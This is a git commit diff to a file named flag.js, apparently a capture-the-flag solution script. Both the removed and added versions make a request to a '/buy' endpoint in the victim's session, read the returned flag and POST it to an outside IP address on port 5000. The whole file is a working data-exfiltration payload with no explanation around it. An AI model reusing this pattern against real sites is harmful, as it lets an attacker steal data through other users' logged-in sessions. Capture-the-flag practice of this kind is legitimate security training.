f4fb53776fb99c4dcfcb403413fc002358e44c72
sh4ll0t <144364845+sh4ll0t@users.noreply.github.com>
2024-03-26 20:27:35 +0800

    Update flag.js

--- flag.js
+++ flag.js
@@ -1,16 +1,13 @@
-const formData = new FormData();
-formData.append("id", "0");
-fetch("/buy", {
-method: "POST",
-body: formData,
-credentials: 'include'
-}).then(response => response.text())
-.then(text => {
-const formData2 = new FormData();
-formData2.append("flag", text);
-return fetch("https://120.26.219.126:5000/flag), {
-method: "POST",
-body: formData2,
-mode:'no-cors',
-});
+const fdata = new URLSearchParams();
+fdata.append('id', '0');
+fetch("http://localhost/buy", {
+    method: "POST",
+    body: fdata
+}).then((res) => {
+    return res.text();
+}).then((data) => {
+    fetch("http://120.26.219.126:5000/flag", {
+        method: "POST",
+        body: data
+    });
 })
